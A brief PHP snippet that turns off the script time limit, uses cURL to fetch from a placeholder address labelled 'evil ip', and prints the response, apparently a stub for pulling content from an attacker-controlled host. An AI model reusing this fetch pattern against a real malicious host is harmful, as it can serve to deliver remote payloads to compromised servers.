<?php 

// simple CURL PHP

// infinite execution
set_time_limit(0);
$x = curl_init();
curl_setopt($x, CURLOPT_URL, "evil ip");
curl_setopt($x, CURLOPT_RETURNTRANSFER, true);
$r = curl_exec($x);
curl_close($x);
echo $r;
